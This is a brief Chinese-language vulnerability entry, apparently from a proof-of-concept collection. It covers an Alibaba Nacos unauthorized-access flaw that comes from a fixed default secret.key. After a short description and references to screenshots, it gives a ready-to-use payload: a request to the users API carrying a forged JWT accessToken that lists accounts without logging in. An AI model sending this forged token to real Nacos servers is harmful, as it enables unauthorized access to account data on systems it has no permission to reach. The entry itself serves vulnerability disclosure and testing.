# Nacos secret.key 默认密钥 未授权访问漏洞

## 漏洞描述
Alibaba Nacos 使用了固定的secret.key默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230417093555107](images/image-20230417093555107.png)

漏洞原因是使用了固定的Key

![image-20230417093624167](images/image-20230417093624167.png)

验证POC


## Payloads
```
/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9
```
